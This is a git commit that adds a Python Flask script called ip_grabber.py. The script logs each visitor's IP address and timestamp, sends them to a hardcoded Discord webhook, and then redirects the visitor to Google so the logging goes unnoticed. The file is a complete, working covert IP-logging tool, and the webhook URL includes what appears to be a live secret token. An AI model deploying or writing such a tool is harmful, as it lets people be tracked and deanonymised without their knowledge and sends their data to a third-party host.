fceaf428b9a3aa61eac48a861e1d8f324089d05b
imalexthegreatskreechontop-lang <imalexthegreatskreechontop@gmail.com>
2026-02-07 16:21:28 +0000

    Add IP logger using Flask and Discord webhook
    Implement IP logging and redirect to Google.

---
+++ ip_grabber.py
@@ -0,0 +1,34 @@
+from flask import Flask, request, redirect
+from datetime import datetime
+import requests
+
+
+app = Flask(__name__)
+
+def send_ip(ip, date):
+    webhook_url = "https://discord.com/api/webhooks/1467940591236288564/cFQVJGS-f_DeTWw26EYL84f2sNRfUAhFgaI5HUEAcHsK4AHS2AFVpKUinner_QbDhC2p"
+    data = {
+        "content": "",
+        "title": "IP Logger"
+    }
+    data["embeds"] = [
+        {
+            "title": ip,
+            "description": date
+         }
+    ]
+    requests.post(webhook_url, json=data)
+
+@app.route("/")
+def index():
+    ip = request.environ.get("HTTP_X_FORWARDED_FOR", request.remote_addr)
+    date = datetime.today().strftime("%Y-%m-%d %H:%M:%S")
+
+    send_ip(ip, date)
+
+    return redirect("https://google.com")
+
+
+
+if __name__ == "__main__":
+    app.run(host='0.0.0.0')
